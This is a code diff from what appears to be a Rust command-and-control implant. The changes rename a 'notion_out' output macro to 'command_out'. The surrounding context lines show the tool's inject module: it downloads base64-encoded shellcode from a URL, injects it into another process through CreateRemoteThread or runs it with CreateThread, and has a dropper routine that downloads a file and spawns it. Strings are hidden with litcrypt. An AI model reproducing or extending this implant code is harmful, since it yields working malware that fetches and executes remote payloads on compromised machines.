@@ -3,7 +3,7 @@ use litcrypt::lc;
 use base64::decode as b64_decode;
 use reqwest::Client;
 use crate::logger::{Logger, log_out};
-use crate::cmd::{CommandArgs, notion_out};
+use crate::cmd::{CommandArgs, command_out};
 #[cfg(windows)] use windows::Win32:: {
     Foundation::{
         CloseHandle,
@@ -162,7 +162,7 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
                 logger.debug(log_out!("Shellcode URL: ", &u));
                 url = u; 
             },
-            None    => { return notion_out!("Could not parse URL"); }
+            None    => { return command_out!("Could not parse URL"); }
         };
 
         // Get b64_iterations
@@ -171,10 +171,10 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
                 if let Ok(b) = bs.parse::<u32>() {
                     b64_iterations = b;
                 } else {
-                    return notion_out!("Could not parse b64 iterations");
+                    return command_out!("Could not parse b64 iterations");
                 }
             },
-            None => { return notion_out!("Could not extract b64 iterations"); }
+            None => { return command_out!("Could not extract b64 iterations"); }
         };
 
         // CALL get_shellcode
@@ -204,7 +204,7 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
                                 let _h_thread = CreateRemoteThread(h, ptr::null_mut(), 0 , Some(std::mem::transmute(addr)), ptr::null_mut(), 0, ptr::null_mut());
                                 CloseHandle(&h);
                             }
-                            return notion_out!("Injection completed!");
+                            return command_out!("Injection completed!");
                         } else {
                             let err_msg = lc!("Could not parse PID");
                             logger.err(err_msg.to_owned());
@@ -261,7 +261,7 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
         
 
                     if mem_protect.0 == 0 {
-                        return notion_out!("Error during injection");
+                        return command_out!("Error during injection");
                     }
 
                     // Call CreateThread
@@ -299,14 +299,14 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
                     //}
                 }
 
-                return notion_out!("Injection completed!");
+                return command_out!("Injection completed!");
                 
             },
-            _ => notion_out!("Unknown injection type!")
+            _ => command_out!("Unknown injection type!")
         }
 
     } else {
-        return notion_out!("Could not parse URL");
+        return command_out!("Could not parse URL");
     }
     
          
@@ -336,7 +336,7 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
                         logger.debug(format!("Shellcode URL: {u}"));
                         url = u; 
                     },
-                    None => { return notion_out!("Could not parse URL"); }
+                    None => { return command_out!("Could not parse URL"); }
                 };
 
                 // Get filename
@@ -345,7 +345,7 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
                         logger.debug(format!("Filename: {f}"));
                         filename = f; 
                     },
-                    None => { return notion_out!("Could not parse filename"); }
+                    None => { return command_out!("Could not parse filename"); }
                 };
 
                 let mut download_args = CommandArgs::from_string(
@@ -374,17 +374,17 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
                     .arg(cmd_string)
                     .spawn()?;
 
-                notion_out!("Dropper completed!")
+                command_out!("Dropper completed!")
             }
-            _ => { return notion_out!("Unknown injection method!") ;}
+            _ => { return command_out!("Unknown injection method!") ;}
         }
 
     } else {
-        return notion_out!("No injection type provided!");
+        return command_out!("No injection type provided!");
     }
 }
 
 #[cfg(macos)]
 pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<String, Box<dyn Error>> {
-    notion_out!("Inject not available on macOS!")
+    command_out!("Inject not available on macOS!")
 }
